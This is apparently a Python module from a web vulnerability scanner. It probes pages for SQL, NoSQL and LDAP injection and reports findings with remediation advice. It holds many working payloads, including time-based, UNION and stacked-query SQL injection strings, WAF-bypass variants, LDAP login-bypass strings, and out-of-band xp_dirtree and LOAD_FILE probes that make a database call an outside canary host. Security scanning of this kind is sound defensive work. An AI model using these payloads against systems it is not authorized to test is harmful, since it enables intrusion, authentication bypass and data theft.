import httpx
import time
import re
import json as _json
from typing import List, Optional
from scanner.core.scan_result import Finding, Severity
from scanner.core.crawler import CrawlResult
from scanner.utils.http import get_url_params, inject_url_param, fetch
from scanner.utils.payloads import load_payloads

ERROR_SIGNATURES = [
    # MySQL / MariaDB
    "you have an error in your sql syntax", "warning: mysql",
    # MSSQL
    "unclosed quotation mark", "quoted string not properly terminated", "odbc sql server driver",
    # PostgreSQL
    "pg::syntaxerror", "syntax error at or near", "pg::error",
    # Oracle
    "ora-01756",
    # SQLite
    "unrecognized token", "near \"",
    # Generic
    "syntax error", "sql syntax", "database error", "sql error", "db error", "query failed",
    # Node.js MySQL2 / mysql driver error codes
    "er_parse_error", "er_bad_field_error", "er_no_such_table", "er_dup_entry",
    # Node.js ORMs
    "sequelize", "knex", "typeorm", "prisma",
    # Python ORMs
    "sqlalchemy", "django.db", "peewee",
    # Ruby
    "activerecord",
    # PHP
    "mysqli_", "pg_query", "sqlite_query",
]

_HARDCODED_ERROR = ["'", '"', "' OR '1'='1'-- ", "' OR 1=1#", "1 AND 1=2-- "]
_HARDCODED_BLIND = [
    # MySQL / MariaDB — AND and OR variants so at least one fires regardless of WHERE context
    "' AND SLEEP(5)-- ",
    "' OR SLEEP(5)-- ",
    "' OR SLEEP(5)#",
    "1 OR SLEEP(5)-- ",
    '" OR SLEEP(5)-- ',
    "') OR SLEEP(5)-- ",
    "' OR IF(1=1,SLEEP(5),0)-- ",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))x)-- ",
    # PostgreSQL — pg_sleep via correlated subquery (works without stacked queries)
    "' AND 1=(SELECT 1 FROM pg_sleep(5))-- ",
    "' OR 1=(SELECT 1 FROM pg_sleep(5))-- ",
    # SQLite — CPU-intensive randomblob; no time parameter (always heavy regardless of delay)
    "' AND 1=(SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)-- ",
    "' OR 1=(SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)-- ",
    # MSSQL — stacked WAITFOR
    "1; WAITFOR DELAY '0:0:5'-- ",
]
_HARDCODED_UNION = [
    "' UNION SELECT NULL-- ",
    "' UNION SELECT NULL,NULL-- ",
    "' UNION SELECT NULL,NULL,NULL-- ",
]
_HARDCODED_BOOLEAN = [
    ("' AND 1=1-- ", "' AND 1=2-- "),   # MySQL/MSSQL/Postgres: -- with trailing space
    ("' AND 1=1#",  "' AND 1=2#"),       # MySQL: hash comment
]

# Stacked query payloads (Gap 5 — technique detection)
_STACKED_PAYLOADS = [
    "'; SELECT SLEEP(2)-- ",
    "1; SELECT SLEEP(2)-- ",
    "'; WAITFOR DELAY '0:0:2'-- ",
]

# UNION-based version extraction (Gap 32 — exfiltration signal)
_VERSION_UNION_PAYLOADS = [
    ("' UNION SELECT @@version-- ", re.compile(r'(\d+\.\d+\.\d+[^\s<"]{0,40})', re.IGNORECASE)),
    ("' UNION SELECT version()-- ", re.compile(r'(PostgreSQL \d+\.\d+[^\s<"]{0,30}|MariaDB[^\s<"]{0,40})', re.IGNORECASE)),
    ("' UNION SELECT NULL,@@version-- ", re.compile(r'(\d+\.\d+\.\d+[^\s<"]{0,40})', re.IGNORECASE)),
]

# Error-based version extraction
_VERSION_ERROR_RE = re.compile(
    r'(MySQL[\s\w./\-]{0,40}\d+\.\d+|PostgreSQL \d+\.\d+|Microsoft SQL Server \d+|Oracle Database \d+)',
    re.IGNORECASE,
)

# NoSQL operator payloads for URL params
NOSQL_PAYLOADS = [
    ('{"$gt": ""}', "application/json"),
    ('{"$ne": null}', "application/json"),
    ('{"$where": "1==1"}', "application/json"),
]

# NoSQL operator payloads for JSON request bodies (Gap 6)
_NOSQL_JSON_OPERATORS = [
    {"$gt": ""},
    {"$ne": None},
    {"$regex": ".*"},
]

LDAP_PAYLOADS = ["*)(uid=*))(|(uid=*", "*)(|(password=*))", "admin)(&)"]

# WAF bypass variants — inline comments, case mutation, space substitution
_WAF_BYPASS_ERROR = [
    "'/**/OR/**/1=1-- ",
    "' /*!OR*/ 1=1-- ",
    "' OR 1=1/*!--*/",
    "'%09OR%091=1-- ",
    "' OR 0x313d31-- ",
]
_WAF_BYPASS_UNION = [
    "' /*!UNION*/ /*!SELECT*/ NULL-- ",
    "' UNION/**/SELECT/**/NULL-- ",
    "' UnIoN SeLeCt NULL-- ",
    "' UNION%20SELECT%20NULL-- ",
]

# HTTP headers to test for injection (reflects back in error messages or delays)
_INJECTABLE_HEADERS = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Custom-IP-Authorization",
]


def _load_sqli():
    data = load_payloads("sqli")
    if not data:
        return _HARDCODED_ERROR, _HARDCODED_BLIND, _HARDCODED_UNION, _HARDCODED_BOOLEAN
    try:
        error = data.get("error_payloads") or _HARDCODED_ERROR
        blind = data.get("blind_payloads") or _HARDCODED_BLIND
        union = data.get("union_payloads") or _HARDCODED_UNION
        bool_pairs = [(p["true"], p["false"]) for p in data.get("boolean_pairs", [])] or _HARDCODED_BOOLEAN
        return error, blind, union, bool_pairs
    except (KeyError, TypeError):
        return _HARDCODED_ERROR, _HARDCODED_BLIND, _HARDCODED_UNION, _HARDCODED_BOOLEAN

ERROR_PAYLOADS, BLIND_PAYLOADS, UNION_PAYLOADS, BOOLEAN_PAYLOAD_PAIRS = _load_sqli()

# DBMS-specific payload overrides
_DBMS_ERROR = {
    "mysql":    ["'", "\" OR 1=1-- ", "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- "],
    "postgres": ["'", "'; SELECT pg_sleep(0)-- ", "' AND 1=CAST(VERSION() AS INTEGER)-- "],
    "mssql":    ["'", "'; SELECT @@VERSION-- ", "' AND 1=CONVERT(int,@@VERSION)-- "],
    "oracle":   ["'", "' OR 1=1-- ", "' UNION SELECT NULL FROM DUAL-- "],
    "sqlite":   ["'", "' AND sqlite_version()='3'-- ", "' UNION SELECT sqlite_version()-- "],
}
_DBMS_BLIND = {
    "mysql":    ["' AND SLEEP({t})-- ", "1 AND SLEEP({t})-- "],
    "postgres": ["'; SELECT pg_sleep({t})-- ", "1; SELECT pg_sleep({t})-- "],
    "mssql":    ["'; WAITFOR DELAY '0:0:{t}'-- ", "1; WAITFOR DELAY '0:0:{t}'-- "],
    "oracle":   ["' AND 1=(SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),{t}) END FROM DUAL)-- "],
    "sqlite":   ["' AND 1=(SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)-- "],
}


def _get_payloads(config):
    """Return (error_payloads, blind_payloads, union_payloads, bool_pairs, delay) honoring dbms/level/risk."""
    level = getattr(config, "level", 1) if config else 1
    risk  = getattr(config, "risk",  1) if config else 1
    dbms  = getattr(config, "dbms", None) if config else None

    # Payload cap by level: 1→3, 2→5, 3→10, 4→20, 5→all
    cap = {1: 3, 2: 5, 3: 10, 4: 20, 5: 9999}.get(level, 3)

    err       = (_DBMS_ERROR.get(dbms, ERROR_PAYLOADS) if dbms else ERROR_PAYLOADS)[:cap]
    union     = UNION_PAYLOADS[:cap]
    bool_pairs = BOOLEAN_PAYLOAD_PAIRS[:cap]

    # Time-based blind at every risk level — delay scales with risk so low-risk scans
    # stay fast while high-risk scans probe more deeply.
    # Double-probe confirmation in _timed_fetch(confirm=True) prevents FPs at any delay.
    # Burp Pro uses time-based as a primary technique; gating it at risk>=2 was overly
    # conservative and the main reason SQLi was missed on many real targets.
    delay = {1: 1, 2: 3, 3: 5}.get(min(risk, 3), 1)
    if dbms and dbms in _DBMS_BLIND:
        blind = [p.format(t=delay) for p in _DBMS_BLIND[dbms]][:cap]
    else:
        blind = [
            p.replace("SLEEP(5)", f"SLEEP({delay})")
             .replace("pg_sleep(5)", f"pg_sleep({delay})")
             .replace("'0:0:5'", f"'0:0:{delay}'")
            for p in BLIND_PAYLOADS[:cap]
        ]

    return err, blind, union, bool_pairs, delay


def test(page: CrawlResult, client: httpx.Client, oob=None, config=None) -> List[Finding]:
    findings = []
    _test_forms(page, client, findings, config)
    _test_json_body_sqli(page, client, findings, config)
    _test_url_params(page, client, findings, config)
    _test_waf_bypass(page, client, findings)
    _test_header_injection(page, client, findings)
    _test_cookie_injection(page, client, findings)
    _test_nosql(page, client, findings)
    _test_nosql_json_bodies(page, client, findings)
    _test_ldap(page, client, findings)

    # Blind OOB SQLi payloads (MSSQL xp_dirtree, MySQL LOAD_FILE DNS exfil)
    if oob and not findings:
        canary = oob.get_canary()
        oob_payloads = [
            f"'; EXEC xp_dirtree '\\\\{canary}\\a'--",
            f"1; EXEC xp_dirtree '\\\\{canary}\\a'--",
            f"' AND LOAD_FILE('\\\\\\\\{canary}\\\\a')--",
            f"1 AND LOAD_FILE('\\\\\\\\{canary}\\\\a')--",
        ]
        params = get_url_params(page.url)
        for param_name in params:
            for payload in oob_payloads:
                try:
                    client.get(inject_url_param(page.url, param_name, payload), timeout=5)
                except Exception:
                    pass
        for form in page.forms:
            for inp in form["inputs"]:
                if not inp["name"]:
                    continue
                for payload in oob_payloads[:2]:
                    data = {i["name"]: i.get("value", "") for i in form["inputs"] if i["name"]}
                    data[inp["name"]] = payload
                    try:
                        client.request(form["method"].upper(), form["action"], data=data, timeout=5)
                    except Exception:
                        pass

    return findings


def _test_forms(page: CrawlResult, client: httpx.Client, findings: List[Finding], config=None):
    err_payloads, blind_payloads, union_payloads, bool_pairs, _blind_delay = _get_payloads(config)

    for form in page.forms:
        input_names = [inp["name"] for inp in form["inputs"] if inp["name"]]
        if not input_names:
            continue

        # Error-based
        for payload in err_payloads:
            data = {name: payload for name in input_names}
            resp = fetch(client, form["method"], form["action"], data)
            if resp:
                matched = _error_match(resp.text)
                if matched:
                    db_version = _extract_version_from_error(resp.text)
                    findings.append(_sqli_finding(
                        form["action"], input_names[0], payload,
                        technique="Error-Based",
                        evidence=f"Database error signature: '{matched}'",
                        db_version=db_version,
                    ))
                    break

        # Measure baseline response time for form — send original (benign) values.
        _form_baseline_data = {i["name"]: i.get("value", "") for i in form["inputs"] if i["name"]}
        _t0 = time.time()
        try:
            client.request(form["method"].upper(), form["action"],
                           data=_form_baseline_data, timeout=12)
        except Exception:
            pass
        _form_baseline_time = time.time() - _t0

        # Stacked queries — delta from baseline, threshold scales with configured delay
        _form_stacked = [
            f"'; SELECT SLEEP({_blind_delay})-- ",
            f"1; SELECT SLEEP({_blind_delay})-- ",
            f"'; WAITFOR DELAY '0:0:{_blind_delay}'-- ",
        ]
        _form_stacked_threshold = max(1.0, _blind_delay * 0.75)
        for payload in _form_stacked:
            data = {name: payload for name in input_names}
            elapsed = _timed_fetch(client, form["method"], form["action"], data,
                                   baseline=_form_baseline_time, threshold=_form_stacked_threshold)
            if elapsed >= _form_stacked_threshold:
                findings.append(_sqli_finding(
                    form["action"], input_names[0], payload,
                    technique="Stacked Queries",
                    evidence=f"Response delta +{elapsed:.1f}s over {_form_baseline_time:.2f}s baseline after stacked query",
                ))
                break

        # Time-based blind — double-probe confirmation, delta from baseline
        _form_time_threshold = max(1.0, _blind_delay * 0.75)
        for payload in blind_payloads:
            data = {name: payload for name in input_names}
            elapsed = _timed_fetch(client, form["method"], form["action"], data, confirm=True,
                                   baseline=_form_baseline_time, threshold=_form_time_threshold)
            if elapsed >= _form_time_threshold:
                findings.append(_sqli_finding(
                    form["action"], input_names[0], payload,
                    technique="Time-Based Blind",
                    evidence=f"Response delta +{elapsed:.1f}s over {_form_baseline_time:.2f}s baseline (double-confirmed)",
                ))
                break


def _test_url_params(page: CrawlResult, client: httpx.Client, findings: List[Finding], config=None):
    params = get_url_params(page.url)
    if not params:
        return

    err_payloads, blind_payloads, union_payloads, bool_pairs, _blind_delay = _get_payloads(config)

    for param_name in params:
        # Error-based
        for payload in err_payloads:
            test_url = inject_url_param(page.url, param_name, payload)
            resp = fetch(client, "get", test_url)
            if resp:
                matched = _error_match(resp.text)
                if matched:
                    db_version = _extract_version_from_error(resp.text)
                    findings.append(_sqli_finding(
                        page.url, param_name, payload,
                        technique="Error-Based",
                        evidence=f"Database error signature: '{matched}'",
                        db_version=db_version,
                    ))
                    break

        # UNION-based — enumerate column count (1-15) then extract DB version.
        # Burp Pro enumerates columns rather than using fixed-count payloads.
        for _cols in range(1, 16):
            _nulls = ",".join(["NULL"] * _cols)
            _probe_url = inject_url_param(page.url, param_name, f"' UNION SELECT {_nulls}-- ")
            _probe_resp = fetch(client, "get", _probe_url)
            if not _probe_resp or _probe_resp.status_code != 200:
                continue
            if _error_match(_probe_resp.text):
                continue
            # Viable column count — inject @@version into each position
            _found_union = False
            for _pos in range(_cols):
                _parts = ["NULL"] * _cols
                _parts[_pos] = "@@version"
                _vpayload = f"' UNION SELECT {','.join(_parts)}-- "
                _vresp = fetch(client, "get", inject_url_param(page.url, param_name, _vpayload))
                if _vresp:
                    _vm = _VERSION_ERROR_RE.search(_vresp.text)
                    if _vm:
                        findings.append(_sqli_finding(
                            page.url, param_name, _vpayload,
                            technique="UNION-Based",
                            evidence=f"DB version via UNION ({_cols} col, pos {_pos+1}): {_vm.group(1)}",
                            db_version=_vm.group(1),
                        ))
                        _found_union = True
                        break
            if _found_union:
                break

        # Hoist original value — reused for timing baseline and boolean baseline.
        original_value = params[param_name][0] if params.get(param_name) else "1"

        # Measure baseline response time before time-based probes.
        # Delta-based detection (elapsed - baseline) catches apps with short DB query
        # timeouts: if SLEEP(2) is killed at 1.5s but baseline is 0.2s, the delta is
        # 1.3s — below an absolute 1.8s threshold but reliably above a 1.0s delta threshold.
        _base_url = inject_url_param(page.url, param_name, original_value)
        _t0 = time.time()
        try:
            client.get(_base_url, timeout=12)
        except Exception:
            pass
        _baseline_time = time.time() - _t0

        # Stacked queries — threshold scales with configured delay, delta from baseline
        _stacked_payloads = [
            f"'; SELECT SLEEP({_blind_delay})-- ",
            f"1; SELECT SLEEP({_blind_delay})-- ",
            f"'; WAITFOR DELAY '0:0:{_blind_delay}'-- ",
        ]
        _stacked_threshold = max(1.0, _blind_delay * 0.75)
        for payload in _stacked_payloads:
            test_url = inject_url_param(page.url, param_name, payload)
            elapsed = _timed_fetch(client, "get", test_url,
                                   baseline=_baseline_time, threshold=_stacked_threshold)
            if elapsed >= _stacked_threshold:
                findings.append(_sqli_finding(
                    page.url, param_name, payload,
                    technique="Stacked Queries",
                    evidence=f"Response delta +{elapsed:.1f}s over {_baseline_time:.2f}s baseline after stacked query",
                ))
                break

        # Time-based blind — double-probe confirmation, delta from baseline
        _time_threshold = max(1.0, _blind_delay * 0.75)
        for payload in blind_payloads:
            test_url = inject_url_param(page.url, param_name, payload)
            elapsed = _timed_fetch(client, "get", test_url, confirm=True,
                                   baseline=_baseline_time, threshold=_time_threshold)
            if elapsed >= _time_threshold:
                findings.append(_sqli_finding(
                    page.url, param_name, payload,
                    technique="Time-Based Blind",
                    evidence=f"Response delta +{elapsed:.1f}s over {_baseline_time:.2f}s baseline (double-confirmed)",
                ))
                break

        # Boolean-based blind — directional comparison:
        # TRUE condition should behave like the original request (baseline), while
        # FALSE condition diverges. Using the original param value as baseline (not
        # "1") eliminates the shifted-baseline problem on apps where "1" produces
        # different results than the actual original value.
        # Percentage-based threshold handles pages of all sizes: large e-commerce
        # pages and small API endpoints are both covered by the 3% relative diff.
        for true_payload, false_payload in bool_pairs:
            try:
                r_base  = client.get(inject_url_param(page.url, param_name, original_value))
                r_true  = client.get(inject_url_param(page.url, param_name, true_payload))
                r_false = client.get(inject_url_param(page.url, param_name, false_payload))
                if r_true.status_code != 200 or r_false.status_code != 200:
                    continue
                base_len  = len(r_base.text)
                true_len  = len(r_true.text)
                false_len = len(r_false.text)
                tf_diff     = abs(true_len - false_len)
                true_drift  = abs(true_len - base_len)
                false_drift = abs(false_len - base_len)
                max_len     = max(true_len, false_len, 1)
                pct_diff    = tf_diff / max_len
                # Signal: FALSE diverges from baseline more than TRUE does (directional).
                # Require BOTH directional asymmetry AND minimum absolute/relative diff.
                directional = false_drift > true_drift + 30
                significant = tf_diff > 50 or pct_diff > 0.03
                if significant and directional:
                    findings.append(_sqli_finding(
                        page.url, param_name, true_payload,
                        technique="Boolean-Based Blind",
                        evidence=(
                            f"TRUE={true_len}B vs FALSE={false_len}B "
                            f"(diff {tf_diff}B, {pct_diff*100:.1f}%); "
                            f"baseline={base_len}B; "
                            f"FALSE drifted {false_drift}B vs TRUE drifted {true_drift}B"
                        ),
                    ))
                    break
                # Structural fallback: same byte-length pages (fixed-scaffold apps).
                # Slice into the mid-section (skip nav/header at top, scripts at bottom)
                # where query results actually differ. TRUE should match baseline content;
                # FALSE should differ — that asymmetry confirms injectable parameter.
                _mid = slice(200, min(len(r_base.text), 2000))
                base_mid  = r_base.text[_mid]
                true_mid  = r_true.text[_mid]
                false_mid = r_false.text[_mid]
                if base_mid and true_mid == base_mid and false_mid != base_mid:
                    findings.append(_sqli_finding(
                        page.url, param_name, true_payload,
                        technique="Boolean-Based Blind (structural)",
                        evidence=(
                            "TRUE response body matches baseline mid-section; "
                            "FALSE diverges — fixed-scaffold page with injectable param"
                        ),
                    ))
                    break
            except Exception:
                continue


def _test_nosql(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    content_type = page.headers.get("content-type", "")
    if "json" not in content_type and "javascript" not in content_type:
        return

    for param_name in get_url_params(page.url):
        # Baseline: clean request with original param value
        try:
            baseline = client.get(page.url)
            baseline_len = len(baseline.text)
            baseline_status = baseline.status_code
        except Exception:
            continue

        for payload, ct in NOSQL_PAYLOADS:
            test_url = inject_url_param(page.url, param_name, payload)
            try:
                resp = client.get(test_url)
            except Exception:
                continue
            # Only report if the injection produced a meaningfully different response
            # (status change or significant body length difference vs. baseline).
            status_changed = resp.status_code != baseline_status
            len_diff = abs(len(resp.text) - baseline_len)
            if resp.status_code == 200 and (status_changed or len_diff > 200):
                findings.append(Finding(
                    title="NoSQL Injection (URL Parameter)",
                    severity=Severity.CRITICAL,
                    url=page.url,
                    parameter=param_name,
                    payload=payload,
                    evidence=(
                        f"NoSQL operator caused behavioral change: "
                        f"baseline={baseline_status}/{baseline_len}B, "
                        f"injected={resp.status_code}/{len(resp.text)}B"
                    ),
                    description="NoSQL injection allows attackers to bypass authentication or extract data from NoSQL databases (MongoDB, etc.).",
                    remediation="Validate and sanitize all inputs. Use typed schemas. Never pass raw user input as query operators.",
                    cwe="CWE-943",
                    cvss=9.8,
                    owasp_category="A03:2021 Injection",
                    standards=["ISO27001-8.23", "HIPAA-164.312a"],
                    confidence=0.75,
                ))
                break


def _test_nosql_json_bodies(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    """Gap 6 — inject NoSQL operators into JSON request bodies."""
    for form in page.forms:
        inputs = {i["name"]: i.get("value", "") for i in form["inputs"] if i["name"]}
        if not inputs:
            continue

        # Build baseline JSON body
        baseline_resp = None
        try:
            baseline_resp = client.request(
                form["method"].upper(), form["action"],
                json=inputs, headers={"Content-Type": "application/json"}, timeout=10,
            )
        except Exception:
            continue

        if not baseline_resp or baseline_resp.status_code not in (200, 201, 401, 403):
            continue

        baseline_len = len(baseline_resp.text)

        for field_name in inputs:
            for operator in _NOSQL_JSON_OPERATORS:
                injected = dict(inputs)
                injected[field_name] = operator
                try:
                    resp = client.request(
                        form["method"].upper(), form["action"],
                        json=injected, headers={"Content-Type": "application/json"}, timeout=10,
                    )
                except Exception:
                    continue

                # Successful bypass: was 401/403, now 200 — or significantly different body
                bypassed = (
                    baseline_resp.status_code in (401, 403) and resp.status_code == 200
                ) or (
                    resp.status_code == 200 and abs(len(resp.text) - baseline_len) > 200
                )
                if bypassed:
                    findings.append(Finding(
                        title="NoSQL Injection (JSON Body)",
                        severity=Severity.CRITICAL,
                        url=form["action"],
                        parameter=field_name,
                        payload=_json.dumps({field_name: operator}),
                        evidence=(
                            f"JSON body injection with operator {operator} changed response: "
                            f"baseline={baseline_resp.status_code}/{baseline_len}B → "
                            f"injected={resp.status_code}/{len(resp.text)}B"
                        ),
                        description=(
                            "NoSQL injection in JSON request body allows attackers to bypass "
                            "authentication or manipulate queries by injecting MongoDB-style "
                            "operator objects (e.g., {\"$gt\": \"\"}) into field values."
                        ),
                        remediation=(
                            "Validate that all JSON field values are of the expected scalar type "
                            "(string/number/boolean). Reject objects in string fields. "
                            "Use ODM-level input sanitization."
                        ),
                        cwe="CWE-943",
                        cvss=9.8,
                        owasp_category="A03:2021 Injection",
                        standards=["ISO27001-8.23", "HIPAA-164.312a"],
                        confidence=0.80,
                    ))
                    break


def _test_ldap(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    for form in page.forms:
        input_names = [i["name"] for i in form["inputs"] if i["name"]]
        if not input_names:
            continue
        for payload in LDAP_PAYLOADS:
            data = {name: payload for name in input_names}
            resp = fetch(client, form["method"], form["action"], data)
            if resp and resp.status_code == 200 and _looks_like_ldap_bypass(resp.text):
                findings.append(Finding(
                    title="LDAP Injection",
                    severity=Severity.CRITICAL,
                    url=form["action"],
                    parameter=input_names[0],
                    payload=payload,
                    evidence="LDAP injection payload returned successful response (possible authentication bypass)",
                    description="LDAP injection allows authentication bypass or directory traversal against LDAP/Active Directory backends.",
                    remediation="Escape all special LDAP characters in user input. Use parameterized LDAP queries.",
                    cwe="CWE-90",
                    cvss=9.8,
                    owasp_category="A03:2021 Injection",
                    standards=["ISO27001-8.8", "HIPAA-164.312a"],
                    confidence=0.65,
                ))
                break


def _looks_like_ldap_bypass(body: str) -> bool:
    success_hints = ["welcome", "dashboard", "logged in", "profile", "account", "home"]
    return any(h in body.lower() for h in success_hints)


def _error_match(body: str) -> Optional[str]:
    body_lower = body.lower()
    return next((s for s in ERROR_SIGNATURES if s in body_lower), None)


def _extract_version_from_error(body: str) -> Optional[str]:
    """Gap 32 — extract DB version string from error message."""
    m = _VERSION_ERROR_RE.search(body)
    return m.group(1) if m else None


def _timed_fetch(client: httpx.Client, method: str, url: str, data: Optional[dict] = None,
                 confirm: bool = False, baseline: float = 0.0, threshold: float = 4.5,
                 json_body: Optional[dict] = None) -> float:
    """Return seconds attributable to the payload (elapsed minus baseline latency).

    confirm=True runs a second probe; both must exceed threshold before returning a
    non-zero value. Pass baseline= (a prior uninjected response time) and threshold=
    (the configured SLEEP delay * 0.75) so the check is a delta, not an absolute time —
    this catches cases where the app's DB query timeout is shorter than the SLEEP value.
    json_body=, when set, submits POST requests as application/json instead of form-urlencoded.
    """
    def _once() -> float:
        try:
            start = time.time()
            if method == "post":
                if json_body is not None:
                    client.post(url, json=json_body,
                                headers={"Content-Type": "application/json"})
                else:
                    client.post(url, data=data or {})
            else:
                client.get(url)
            return max(time.time() - start - baseline, 0.0)
        except Exception:
            return 0.0

    first = _once()
    if not confirm or first < threshold:
        return first
    second = _once()
    return second if second >= threshold else 0.0


def _test_json_body_sqli(page: CrawlResult, client: httpx.Client,
                         findings: List[Finding], config=None) -> None:
    """SQLi via JSON POST body — covers REST APIs that ignore form-urlencoded.

    Many modern endpoints (Express, FastAPI, Django REST, Spring Boot) only parse
    application/json. _test_forms submits form-urlencoded which those endpoints
    silently discard. This function retries every POST form as JSON so the payload
    actually reaches the SQL layer on JSON-only endpoints.
    """
    err_payloads, blind_payloads, _, bool_pairs, _blind_delay = _get_payloads(config)

    for form in page.forms:
        if form["method"].upper() != "POST":
            continue
        inputs = {i["name"]: i.get("value", "") for i in form["inputs"] if i["name"]}
        if not inputs:
            continue

        # Error-based: inject each field with SQL error payloads as JSON
        for field_name in list(inputs.keys()):
            for payload in err_payloads:
                body = dict(inputs)
                body[field_name] = payload
                try:
                    resp = client.post(
                        form["action"], json=body,
                        headers={"Content-Type": "application/json"}, timeout=10,
                    )
                except Exception:
                    continue
                matched = _error_match(resp.text)
                if matched:
                    findings.append(_sqli_finding(
                        form["action"], field_name, payload,
                        technique="Error-Based (JSON)",
                        evidence=f"DB error in JSON body response: '{matched}'",
                        db_version=_extract_version_from_error(resp.text),
                    ))
                    break

        # Baseline for timing: original field values submitted as JSON
        _t0 = time.time()
        try:
            client.post(form["action"], json=inputs,
                        headers={"Content-Type": "application/json"}, timeout=12)
        except Exception:
            pass
        _baseline_time = time.time() - _t0

        _time_threshold = max(1.0, _blind_delay * 0.75)

        # Time-based blind: inject each field individually as JSON, measure delta
        for field_name in list(inputs.keys()):
            for payload in blind_payloads:
                body = dict(inputs)
                body[field_name] = payload
                elapsed = _timed_fetch(
                    client, "post", form["action"],
                    confirm=True, baseline=_baseline_time,
                    threshold=_time_threshold, json_body=body,
                )
                if elapsed >= _time_threshold:
                    findings.append(_sqli_finding(
                        form["action"], field_name, payload,
                        technique="Time-Based Blind (JSON)",
                        evidence=(
                            f"JSON field '{field_name}' delayed response "
                            f"+{elapsed:.1f}s over {_baseline_time:.2f}s baseline "
                            f"(double-confirmed)"
                        ),
                    ))
                    return

        # Boolean-based: compare TRUE vs FALSE JSON responses
        for field_name in list(inputs.keys()):
            for true_payload, false_payload in bool_pairs:
                try:
                    body_base  = dict(inputs)
                    body_true  = dict(inputs)
                    body_true[field_name]  = true_payload
                    body_false = dict(inputs)
                    body_false[field_name] = false_payload
                    r_base  = client.post(form["action"], json=body_base,  timeout=10)
                    r_true  = client.post(form["action"], json=body_true,  timeout=10)
                    r_false = client.post(form["action"], json=body_false, timeout=10)
                    if r_true.status_code != 200 or r_false.status_code != 200:
                        continue
                    tf_diff     = abs(len(r_true.text) - len(r_false.text))
                    base_len    = len(r_base.text)
                    false_drift = abs(len(r_false.text) - base_len)
                    true_drift  = abs(len(r_true.text)  - base_len)
                    if tf_diff > 50 and false_drift > true_drift + 30:
                        findings.append(_sqli_finding(
                            form["action"], field_name, true_payload,
                            technique="Boolean-Based Blind (JSON)",
                            evidence=(
                                f"JSON TRUE={len(r_true.text)}B vs FALSE={len(r_false.text)}B "
                                f"(diff {tf_diff}B); baseline={base_len}B; "
                                f"FALSE drifted {false_drift}B vs TRUE drifted {true_drift}B"
                            ),
                        ))
                        return
                except Exception:
                    continue


def _test_waf_bypass(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    """Test WAF bypass variants when standard payloads find nothing."""
    params = get_url_params(page.url)
    if not params:
        return
    for param_name in params:
        for payload in _WAF_BYPASS_ERROR:
            test_url = inject_url_param(page.url, param_name, payload)
            resp = fetch(client, "get", test_url)
            if resp:
                matched = _error_match(resp.text)
                if matched:
                    findings.append(_sqli_finding(
                        page.url, param_name, payload,
                        technique="Error-Based (WAF Bypass)",
                        evidence=f"DB error after WAF-bypass payload: '{matched}'",
                    ))
                    return
        for payload in _WAF_BYPASS_UNION:
            test_url = inject_url_param(page.url, param_name, payload)
            resp = fetch(client, "get", test_url)
            if resp:
                m = _VERSION_ERROR_RE.search(resp.text)
                if m:
                    findings.append(_sqli_finding(
                        page.url, param_name, payload,
                        technique="UNION-Based (WAF Bypass)",
                        evidence=f"DB version via WAF-bypass UNION: {m.group(1)}",
                        db_version=m.group(1),
                    ))
                    return


def _test_header_injection(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    """Test time-based SQLi in common HTTP request headers."""
    blind_payload = "' AND SLEEP(5)--"
    baseline = _timed_fetch(client, "get", page.url)
    for header in _INJECTABLE_HEADERS:
        try:
            start = time.time()
            client.get(page.url, headers={header: blind_payload}, timeout=12)
            elapsed = time.time() - start
        except Exception:
            continue
        if elapsed >= 4.5 and elapsed > baseline + 3:
            # Confirm with a second probe
            try:
                start = time.time()
                client.get(page.url, headers={header: blind_payload}, timeout=12)
                elapsed2 = time.time() - start
            except Exception:
                continue
            if elapsed2 >= 4.5:
                findings.append(_sqli_finding(
                    page.url, header, blind_payload,
                    technique="Time-Based Blind (Header)",
                    evidence=f"Request delayed {elapsed:.1f}s/{elapsed2:.1f}s when injecting into {header} header",
                ))
                return


def _test_cookie_injection(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    """Test SQLi payloads in cookie values that look like IDs or session params."""
    cookies = dict(client.cookies)
    if not cookies:
        return
    _id_re = re.compile(r'\d+|[a-f0-9]{8,}', re.IGNORECASE)
    for name, value in list(cookies.items()):
        if not _id_re.search(value):
            continue
        for payload in ["'", "' OR 1=1--", "' AND SLEEP(3)--"]:
            try:
                resp = client.get(page.url, cookies={**cookies, name: payload}, timeout=8)
            except Exception:
                continue
            matched = _error_match(resp.text)
            if matched:
                findings.append(_sqli_finding(
                    page.url, f"Cookie:{name}", payload,
                    technique="Error-Based (Cookie)",
                    evidence=f"DB error after cookie injection: '{matched}'",
                ))
                return


def _sqli_finding(
    url: str,
    param: str,
    payload: str,
    technique: str,
    evidence: str,
    db_version: Optional[str] = None,
) -> Finding:
    """Gap 5 — unified SQLi finding with confirmed technique in title and evidence."""
    version_note = f" DB version: {db_version}." if db_version else ""
    return Finding(
        title=f"SQL Injection ({technique})",
        severity=Severity.CRITICAL,
        url=url,
        parameter=param,
        payload=payload,
        evidence=evidence + version_note,
        description=(
            f"SQL injection ({technique.lower()}) confirmed. Attackers can read, modify, "
            "or delete database data, and potentially escalate to OS-level access."
        ),
        remediation=(
            "Use parameterized queries / prepared statements. "
            "Never concatenate user input into SQL strings. "
            "Apply least-privilege DB accounts."
        ),
        cwe="CWE-89",
        cvss=9.8,
        owasp_category="A03:2021 Injection",
        standards=["ISO27001-8.23", "HIPAA-164.312a", "GDPR-Art32", "APPI-Art20"],
        confidence=1.0,
    )
